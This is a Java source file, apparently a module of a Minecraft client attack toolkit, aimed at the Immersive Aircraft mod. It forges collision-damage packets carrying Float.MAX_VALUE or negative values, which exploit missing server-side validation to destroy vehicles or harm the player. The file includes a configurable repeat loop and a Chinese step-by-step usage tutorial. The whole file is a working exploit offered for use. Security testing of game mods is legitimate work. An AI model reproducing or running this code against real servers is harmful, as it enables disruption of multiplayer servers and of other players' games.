package com.redblue.red.modules.immersiveaircraft;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * IA-01: Client-controlled collision damage -- arbitrary vehicle destruction & player kill.
 *
 * CollisionMessage.receive() passes this.damage directly to vehicle.m_6469_(flyIntoWall, damage)
 * with zero validation: no range check, no rate limit, no float sanitization.
 *
 * Precondition: player must be riding (getRootVehicle()) a VehicleEntity.
 *
 * Wire format (index 5): writeFloat(damage)
 */
public class IA01_CollisionDamage implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ic_air", "main");
    private static final int IDX_COLLISION = 5;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "攻击模式", "DESTROY_VEHICLE",
                "DESTROY_VEHICLE", "SELF_DAMAGE", "NEGATIVE_HEAL"),
        ConfigParam.ofFloat("damage", "伤害值", 3.4028235E38f, -3.4028235E38f, 3.4028235E38f),
        ConfigParam.ofInt("repeat_count", "重复次数", 1, 1, 100),
        ConfigParam.ofBool("auto_repeat", "自动循环", false),
        ConfigParam.ofInt("interval", "循环间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "ia01_collision_damage"; }
    @Override public String name() { return "碰撞伤害注入"; }

    @Override
    public String description() {
        return "伪造碰撞伤害包，摧毁载具或对自身造成伤害";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 骑乘任意 Immersive Aircraft 载具\n"
            + "2. 选择攻击模式:\n"
            + "   - DESTROY_VEHICLE: 发送 Float.MAX_VALUE 立即摧毁载具\n"
            + "   - SELF_DAMAGE: 载具摧毁后 damage*crashDamage 应用到玩家\n"
            + "   - NEGATIVE_HEAL: 发送负伤害值尝试治疗载具\n"
            + "3. 点击「执行」或启用自动循环\n\n"
            + "[前置条件]\n"
            + "- 必须骑乘 VehicleEntity (getRootVehicle 检查)\n\n"
            + "[注意事项]\n"
            + "- DESTROY_VEHICLE 模式会立即摧毁你正在骑乘的载具\n"
            + "- 如果服务器 preventKillThroughCrash=false，可能导致自杀";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("immersive_aircraft");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        float damage = resolveDamage();
        int count = getParam("repeat_count").map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < count; i++) {
            sendCollision(damage);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("auto_repeat").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private float resolveDamage() {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("DESTROY_VEHICLE");
        switch (mode) {
            case "DESTROY_VEHICLE":
            case "SELF_DAMAGE":
                return Float.MAX_VALUE;
            case "NEGATIVE_HEAL":
                return -Float.MAX_VALUE;
            default:
                return getParam("damage").map(ConfigParam::getFloat).orElse(Float.MAX_VALUE);
        }
    }

    private void sendCollision(float damage) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_COLLISION);
            buf.writeFloat(damage);
        });
    }
}
